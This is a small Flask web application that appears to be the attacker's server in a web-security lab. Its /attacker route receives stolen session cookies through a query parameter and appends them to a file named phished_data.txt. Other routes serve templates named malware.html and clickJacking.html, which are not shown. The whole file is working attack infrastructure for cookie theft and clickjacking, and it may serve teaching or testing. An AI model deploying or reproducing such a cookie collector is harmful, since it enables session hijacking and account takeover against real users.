from flask import Flask, jsonify, render_template, request

app = Flask(__name__)
data = "D"
@app.route("/")
def hello_world():
    return "<p>Hellos, World!</p> " + data 

@app.route("/attacker", methods = ['GET'])
def attacker():
    session_cookie = request.args.get('cookie')
    file = open("phished_data.txt", "a")
    file.write(session_cookie)
    file.write("\n")
    file.close()

    return " "

@app.route("/malware")
def malware():
    return render_template('malware.html')
 
@app.route("/click-jacker")
def click_jacker():
    return render_template('clickJacking.html')
 